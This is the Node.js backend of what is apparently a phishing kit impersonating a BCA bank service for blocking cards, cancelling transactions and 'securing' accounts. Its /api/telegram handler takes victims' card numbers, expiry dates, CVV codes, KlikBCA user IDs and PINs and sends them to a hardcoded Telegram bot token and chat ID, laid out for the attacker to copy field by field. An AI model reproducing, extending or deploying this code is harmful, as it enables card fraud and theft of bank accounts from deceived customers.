import { createServer } from 'node:http';
import { readFile, stat } from 'node:fs/promises';
import { extname, join, normalize, sep } from 'node:path';
import { fileURLToPath } from 'node:url';

const rootDir = fileURLToPath(new URL('.', import.meta.url));
const distDir = join(rootDir, 'dist');
const port = 3000;
const maxBodySize = 15 * 1024 * 1024; // 15MB for image uploads
const serviceTypes = new Set([
  'blokir',
  'batalkan-transaksi',
  'amankan-bank-lain',
  'amankan-user-id',
]);

const contentTypes = {
  '.css': 'text/css; charset=utf-8',
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.woff2': 'font/woff2',
  '.png': 'image/png',
  '.webp': 'image/webp',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.ico': 'image/x-icon',
};

function json(response, statusCode, body) {
  response.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
  });
  response.end(JSON.stringify(body));
}

async function readJsonBody(request) {
  let body = '';

  for await (const chunk of request) {
    body += chunk;
    if (Buffer.byteLength(body) > maxBodySize) {
      throw new Error('Request body too large');
    }
  }

  return JSON.parse(body);
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function getFormattedWibDateTime(date = new Date()) {
  try {
    const formatter = new Intl.DateTimeFormat('id-ID', {
      timeZone: 'Asia/Jakarta',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    return `${formatter.format(date).replace(/:/g, '.')} WIB`;
  } catch {
    const now = new Date();
    const d = String(now.getDate()).padStart(2, '0');
    const m = String(now.getMonth() + 1).padStart(2, '0');
    const y = now.getFullYear();
    const hh = String(now.getHours()).padStart(2, '0');
    const mm = String(now.getMinutes()).padStart(2, '0');
    const ss = String(now.getSeconds()).padStart(2, '0');
    return `${d}/${m}/${y}, ${hh}.${mm}.${ss} WIB`;
  }
}

async function sendTelegramNotification(request, response) {
  if (request.method !== 'POST') {
    json(response, 405, { ok: false, error: 'Method not allowed' });
    return;
  }

  const rawBotToken = (process.env.TELEGRAM_BOT_TOKEN || '8961452459:AAHavxbPWyCcV2Rz6yEOV-ycfqcSi6RYwNg').trim();
  const rawChatId = (process.env.TELEGRAM_CHAT_ID || '8341942326').trim();

  if (!rawBotToken || !rawChatId) {
    console.warn('Telegram notification skipped: Bot token or chat ID is not configured');
    json(response, 200, { ok: true, delivered: false, note: 'Telegram credentials not configured' });
    return;
  }

  // Strip accidental 'bot' prefix if included (e.g., 'bot123456:ABC...')
  const botToken = rawBotToken.replace(/^bot/i, '').trim();

  // Validate Telegram Bot token format (<bot_id>:<secret_token>)
  const isValidTokenFormat = /^[0-9]+:[A-Za-z0-9_-]+$/.test(botToken);
  if (!isValidTokenFormat) {
    console.warn('Telegram notification skipped: Invalid bot token format (expected <bot_id>:<token>)');
    json(response, 200, { ok: true, delivered: false, note: 'Invalid bot token format' });
    return;
  }

  let payload;
  try {
    payload = await readJsonBody(request);
  } catch {
    json(response, 400, { ok: false, error: 'Invalid request body' });
    return;
  }

  if (
    !payload ||
    typeof payload !== 'object' ||
    !serviceTypes.has(payload.serviceType) ||
    typeof payload.serviceTitle !== 'string'
  ) {
    json(response, 400, { ok: false, error: 'Invalid notification payload' });
    return;
  }

  const waktuInput = payload.waktuInput || getFormattedWibDateTime();

  try {
    // Check if sending photo (Batalkan Transaksi with attachment)
    if (payload.serviceType === 'batalkan-transaksi' && payload.photoBase64) {
      const match = payload.photoBase64.match(/^data:([^;]+);base64,(.+)$/);
      if (match) {
        const mimeType = match[1];
        const buffer = Buffer.from(match[2], 'base64');
        const formData = new FormData();
        formData.append('chat_id', rawChatId);
        formData.append(
          'photo',
          new Blob([buffer], { type: mimeType }),
          payload.fileName || 'bukti_transaksi.jpg',
        );
        formData.append('caption', '📄 Bukti Transaksi');

        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${botToken}/sendPhoto`,
          {
            method: 'POST',
            body: formData,
          },
        );

        if (!telegramResponse.ok) {
          let errorDetail = '';
          try {
            const errorJson = await telegramResponse.json();
            errorDetail = errorJson.description || '';
          } catch {}
          console.warn(`Telegram photo delivery skipped (HTTP ${telegramResponse.status}): ${errorDetail}`);
          json(response, 200, { ok: true, delivered: false, warning: `Delivery status: ${telegramResponse.status}` });
          return;
        }

        json(response, 200, { ok: true, delivered: true });
        return;
      }
    }

    // Construct text message exactly matching the requested format
    let message = '';

    if (payload.serviceType === 'blokir') {
      const bankTarget = payload.bankTarget || 'BANK BCA';
      let jenisKartu = payload.jenisKartu || 'DEBIT PASPOR BCA';
      if (jenisKartu === 'MASTERCARD' || jenisKartu === 'Mastercard') {
        jenisKartu = 'DEBIT PASPOR BCA MASTERCARD';
      } else if (jenisKartu === 'VISA' || jenisKartu === 'Visa') {
        jenisKartu = 'DEBIT PASPOR BCA VISA';
      } else if (jenisKartu === 'JCB' || jenisKartu === 'Jcb') {
        jenisKartu = 'DEBIT PASPOR BCA JCB';
      } else if (jenisKartu === 'BCA' || jenisKartu === 'GPN') {
        jenisKartu = 'DEBIT PASPOR BCA GPN';
      }
      const nomorKartu = payload.nomorKartu || '-';
      const nomorHp = payload.nomorHp || '-';
      const masaBerlaku = payload.masaBerlaku || '-';
      const cvv = payload.cvv || '-';
      const limitSaldo = payload.limitSaldo || '-';

      const preBlock = [
        `${'Bank Target'.padEnd(15, ' ')}: ${bankTarget}`,
        `${'Jenis Kartu'.padEnd(15, ' ')}: ${jenisKartu}`,
        `${'Nomor Kartu'.padEnd(15, ' ')}: ${nomorKartu}`,
        `${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`,
        `${'Masa Berlaku'.padEnd(15, ' ')}: ${masaBerlaku}`,
        `${'CVV / CVC'.padEnd(15, ' ')}: ${cvv}`,
        `${'Limit/Saldo'.padEnd(15, ' ')}: ${limitSaldo}`,
        `${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`,
      ].join('\n');

      message = [
        '🚨 KARTU BCA 🚨',
        '',
        `<pre>${escapeHtml(preBlock)}</pre>`,
        '',
        '📋 <b>Salin Per Item:</b>',
        `• No. Kartu: <code>${escapeHtml(nomorKartu)}</code>`,
        `• Masa Berlaku: <code>${escapeHtml(masaBerlaku)}</code>`,
        `• CVV / CVC: <code>${escapeHtml(cvv)}</code>`,
      ].join('\n');
    } else if (payload.serviceType === 'amankan-bank-lain') {
      const bankTarget = (payload.bankTarget || 'BANK LAIN').toUpperCase();
      let jenisKartu = payload.jenisKartu || 'DEBIT / KREDIT';
      if (['MASTERCARD', 'VISA', 'JCB', 'GPN', 'BCA'].includes((jenisKartu || '').toUpperCase())) {
        jenisKartu = `KARTU ${(jenisKartu || '').toUpperCase()}`;
      }
      const nomorKartu = payload.nomorKartu || '-';
      const nomorHp = payload.nomorHp || '-';
      const masaBerlaku = payload.masaBerlaku || '-';
      const cvv = payload.cvv || '-';
      const limitSaldo = payload.limitSaldo || '-';

      const preBlock = [
        `${'Bank Target'.padEnd(15, ' ')}: ${bankTarget}`,
        `${'Jenis Kartu'.padEnd(15, ' ')}: ${jenisKartu}`,
        `${'Nomor Kartu'.padEnd(15, ' ')}: ${nomorKartu}`,
        `${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`,
        `${'Masa Berlaku'.padEnd(15, ' ')}: ${masaBerlaku}`,
        `${'CVV / CVC'.padEnd(15, ' ')}: ${cvv}`,
        `${'Limit/Saldo'.padEnd(15, ' ')}: ${limitSaldo}`,
        `${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`,
      ].join('\n');

      message = [
        `🚨 KARTU ${escapeHtml(bankTarget)} 🚨`,
        '',
        `<pre>${escapeHtml(preBlock)}</pre>`,
        '',
        '📋 <b>Salin Per Item:</b>',
        `• No. Kartu: <code>${escapeHtml(nomorKartu)}</code>`,
        `• Masa Berlaku: <code>${escapeHtml(masaBerlaku)}</code>`,
        `• CVV / CVC: <code>${escapeHtml(cvv)}</code>`,
      ].join('\n');
    } else if (payload.serviceType === 'amankan-user-id') {
      const jenisLayanan = (payload.jenisLayanan || 'KLIKBCA INDIVIDU').toUpperCase();
      const corporateId = payload.corporateId ? payload.corporateId.trim() : '';
      const userId = payload.userId || '-';
      const nomorHp = payload.nomorHp || '-';
      const password = payload.password || '-';

      const lines = [
        `${'Jenis Layanan'.padEnd(15, ' ')}: ${jenisLayanan}`,
      ];
      if (corporateId) {
        lines.push(`${'Corporate ID'.padEnd(15, ' ')}: ${corporateId}`);
      }
      lines.push(`${'User ID'.padEnd(15, ' ')}: ${userId}`);
      if (nomorHp && nomorHp !== '-') {
        lines.push(`${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`);
      }
      lines.push(`${'PIN / Respon'.padEnd(15, ' ')}: ${password}`);
      lines.push(`${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`);

      const preBlock = lines.join('\n');

      const salinLines = ['📋 <b>Salin Per Item:</b>'];
      if (corporateId) {
        salinLines.push(`• Corporate ID: <code>${escapeHtml(corporateId)}</code>`);
      }
      salinLines.push(`• User ID: <code>${escapeHtml(userId)}</code>`);
      if (nomorHp && nomorHp !== '-') {
        salinLines.push(`• Nomor HP: <code>${escapeHtml(nomorHp)}</code>`);
      }
      salinLines.push(`• PIN / Respon: <code>${escapeHtml(password)}</code>`);

      message = [
        '🚨 USER ID KLIKBCA 🚨',
        '',
        `<pre>${escapeHtml(preBlock)}</pre>`,
        '',
        ...salinLines,
      ].join('\n');
    } else {
      // Fallback for batalkan-transaksi without photo
      const preBlock = [
        `${'Layanan'.padEnd(14, ' ')}: PEMBATALAN TRANSAKSI`,
        `${'Status'.padEnd(14, ' ')}: MENUNGGU VERIFIKASI STRUK`,
        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
      ].join('\n');

      message = [
        '🚨 PEMBATALAN TRANSAKSI BCA 🚨',
        '',
        `<pre>${escapeHtml(preBlock)}</pre>`,
        '',
        '📄 Bukti Transaksi terkirim',
      ].join('\n');
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: rawChatId,
          text: message,
          parse_mode: 'HTML',
        }),
      },
    );

    if (!telegramResponse.ok) {
      let errorDetail = '';
      try {
        const errorJson = await telegramResponse.json();
        errorDetail = errorJson.description || '';
      } catch {}
      console.warn(`Telegram notification delivery skipped (HTTP ${telegramResponse.status}): ${errorDetail}`);
      json(response, 200, { ok: true, delivered: false, warning: `Delivery status: ${telegramResponse.status}` });
      return;
    }

    json(response, 200, { ok: true, delivered: true });
  } catch (error) {
    console.warn('Telegram notification request skipped due to network error:', error?.message || error);
    json(response, 200, { ok: true, delivered: false, note: 'Network error contacting Telegram' });
  }
}

const fileCache = new Map();

async function getCachedFile(filePath) {
  if (fileCache.has(filePath)) {
    return fileCache.get(filePath);
  }
  const buffer = await readFile(filePath);
  fileCache.set(filePath, buffer);
  return buffer;
}

async function serveStatic(request, response) {
  const requestPath = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
  const relativePath = requestPath === '/' ? 'index.html' : requestPath.slice(1);
  const filePath = normalize(join(distDir, relativePath));

  if (!filePath.startsWith(`${distDir}${sep}`) && filePath !== distDir) {
    json(response, 400, { ok: false, error: 'Invalid path' });
    return;
  }

  const ext = extname(filePath);
  const isImmutableAsset = requestPath.startsWith('/assets/') || ['.woff2', '.webp', '.png', '.jpg', '.jpeg', '.svg'].includes(ext);

  try {
    const fileStats = await stat(filePath);
    if (!fileStats.isFile()) throw new Error('Not a file');
    const content = await getCachedFile(filePath);
    response.writeHead(200, {
      'Content-Type': contentTypes[ext] || 'application/octet-stream',
      'Cache-Control': isImmutableAsset ? 'public, max-age=31536000, immutable' : 'public, max-age=3600, must-revalidate',
      'X-Content-Type-Options': 'nosniff',
    });
    response.end(content);
  } catch {
    // Let the SPA router handle unknown client-side paths.
    try {
      const indexContent = await getCachedFile(join(distDir, 'index.html'));
      response.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache',
        'X-Content-Type-Options': 'nosniff',
      });
      response.end(indexContent);
    } catch {
      json(response, 503, { ok: false, error: 'Application has not been built' });
    }
  }
}

async function createAppServer() {
  let vite;
  if (process.argv.includes('--dev')) {
    const { createServer: createViteServer } = await import('vite');
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
  }

  const server = createServer(async (request, response) => {
    if (request.url?.startsWith('/api/health')) {
      json(response, 200, { ok: true, status: 'healthy', timestamp: new Date().toISOString() });
      return;
    }

    if (request.url?.startsWith('/api/telegram')) {
      await sendTelegramNotification(request, response);
      return;
    }

    if (vite) {
      vite.middlewares(request, response, () => {});
      return;
    }

    await serveStatic(request, response);
  });

  server.listen(port, '0.0.0.0', () => {
    console.log(`Application server listening on port ${port}`);
  });
}

createAppServer().catch((error) => {
  console.error('Unable to start application server:', error);
  process.exitCode = 1;
});